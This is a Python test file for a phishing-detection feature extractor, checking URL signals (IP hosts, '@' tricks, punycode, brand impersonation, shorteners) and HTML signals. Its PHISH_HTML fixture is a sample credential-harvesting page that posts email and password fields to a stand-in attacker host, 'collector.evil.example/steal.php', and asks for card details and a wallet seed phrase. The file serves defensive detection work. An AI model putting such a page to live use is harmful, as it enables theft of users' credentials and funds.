from app.features import (
    HTML_FEATURE_NAMES,
    URL_FEATURE_NAMES,
    canonicalize,
    extract_html_features,
    extract_url_features,
    parse,
)


# ----------------------------------------------------------------------------- URL features
def test_canonicalize_removes_dataset_artefacts():
    assert canonicalize("HTTPS://WWW.Example.COM/") == "example.com"
    assert canonicalize("http://example.com/a/b/#frag") == "example.com/a/b"
    assert canonicalize("example.com") == "example.com"
    # scheme/www/case/trailing slash variants all map to the same features
    variants = ["https://www.example.com", "http://example.com/", "EXAMPLE.com", "www.example.com"]
    feats = [extract_url_features(v) for v in variants]
    assert all(f == feats[0] for f in feats)


def test_vector_shape_and_order():
    f = extract_url_features("https://a.b.example.co.uk/x/y?q=1")
    assert list(f) == list(URL_FEATURE_NAMES)
    assert len(f) == 44
    assert all(isinstance(v, float) for v in f.values())


def test_parse_registered_domain_and_subdomains():
    p = parse("https://login.secure.example.co.uk:8443/path?x=1")
    assert p.registered_domain == "example.co.uk"
    assert p.subdomain == "login.secure"
    assert p.port == "8443"
    assert p.path == "/path" and p.query == "x=1"
    f = extract_url_features("https://login.secure.example.co.uk:8443/path?x=1")
    assert f["num_subdomains"] == 2 and f["has_port"] == 1


def test_ip_and_obfuscation_signals():
    assert extract_url_features("http://192.168.4.20/login")["is_ip_host"] == 1
    assert extract_url_features("http://0x7f000001/")["is_ip_host"] == 1
    assert extract_url_features("http://[2001:db8::1]/x")["is_ip_host"] == 1
    assert extract_url_features("http://paypal.com@evil.com/")["has_at_symbol"] == 1
    assert extract_url_features("http://xn--pple-43d.com/")["has_punycode"] == 1
    assert extract_url_features("http://site.com/redirect?u=http://evil.com")["embedded_url"] == 1


def test_brand_and_hosting_signals():
    f = extract_url_features("https://paypal.secure-login.example.com/verify")
    assert f["brand_outside_domain"] == 1
    assert f["sensitive_word_count"] >= 2
    assert extract_url_features("https://www.paypal.com/signin")["brand_outside_domain"] == 0
    assert extract_url_features("https://paypal-support.com/")["brand_in_domain_not_exact"] == 1
    assert extract_url_features("https://bit.ly/abc")["is_shortener"] == 1
    assert extract_url_features("https://x.firebaseapp.com/")["is_free_hosting"] == 1
    assert extract_url_features("https://x.godaddysites.com/")["is_free_hosting"] == 1
    assert extract_url_features("https://free-prize.tk/")["suspicious_tld"] == 1
    assert extract_url_features("https://example.com/")["suspicious_tld"] == 0


def test_counts():
    f = extract_url_features("https://ex-am-ple.com/a_b/c.php?x=1&y=2%20")
    assert f["num_hyphens_host"] == 2
    assert f["num_underscores"] == 1
    assert f["num_ampersand"] == 1 and f["num_equals"] == 2 and f["num_percent"] == 1
    assert f["has_php"] == 1 and f["has_file_extension"] == 1
    assert f["num_path_segments"] == 2


def test_empty_and_garbage_do_not_crash():
    for u in ["", "   ", "http://", "::::", "a" * 3000]:
        f = extract_url_features(u)
        assert len(f) == len(URL_FEATURE_NAMES)


# ----------------------------------------------------------------------------- HTML features
PHISH_HTML = """
<html><head><title>Account verification</title></head>
<body>
<iframe src="https://x.example.org"></iframe>
<form action="https://collector.evil.example/steal.php" method="post">
  <input type="email" name="u"><input type="password" name="p"><input type="hidden" name="tok">
  <button type="submit">Sign in</button>
</form>
<a href="#">Forgot?</a><a href="javascript:void(0)">Help</a>
<script>window.open('https://ads.example')</script>
<p>Enter your credit card and seed phrase to restore your wallet. Online banking login.</p>
</body></html>
"""

LEGIT_HTML = """<!doctype html>
<html><head><title>Example Shop</title>
<meta name="viewport" content="width=device-width"><meta name="description" content="shop">
<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/a.css"><style>p{}</style>
<script src="/app.js"></script></head>
<body><img src="a.png"><img src="b.png">
<a href="/about">About</a><a href="https://example.com/contact">Contact</a>
<a href="https://www.facebook.com/example">Facebook</a><a href="https://other.org/">Partner</a>
<footer>&copy; 2026 Example Inc.</footer></body></html>"""


def test_html_phishing_page():
    f = extract_html_features(PHISH_HTML, "https://login.example.com/verify", robots_exists=False)
    assert list(f) == list(HTML_FEATURE_NAMES)
    assert f["HasPasswordField"] == 1
    assert f["HasHiddenFields"] == 1
    assert f["HasSubmitButton"] == 1
    assert f["HasExternalFormSubmit"] == 1
    assert f["NoOfiFrame"] == 1
    assert f["NoOfPopup"] == 1
    assert f["NoOfEmptyRef"] == 2
    assert f["Bank"] == 1 and f["Pay"] == 1 and f["Crypto"] == 1
    assert f["HasFavicon"] == 0 and f["Robots"] == 0


def test_html_legit_page():
    f = extract_html_features(LEGIT_HTML, "https://example.com/", robots_exists=True)
    assert f["HasTitle"] == 1 and f["HasFavicon"] == 1 and f["IsResponsive"] == 1 and f["HasDescription"] == 1
    assert f["Robots"] == 1
    assert f["NoOfImage"] == 2 and f["NoOfCSS"] == 2 and f["NoOfJS"] == 1
    assert f["NoOfSelfRef"] == 2  # /about + same registered domain
    assert f["NoOfExternalRef"] == 2  # facebook + other.org
    assert f["HasSocialNet"] == 1 and f["HasCopyrightInfo"] == 1
    assert f["HasPasswordField"] == 0 and f["HasExternalFormSubmit"] == 0
    assert f["LineOfCode"] == LEGIT_HTML.count("\n") + 1


def test_html_empty():
    f = extract_html_features("", "https://example.com/")
    assert f["LineOfCode"] == 0 and f["HasTitle"] == 0 and sum(f.values()) == 0
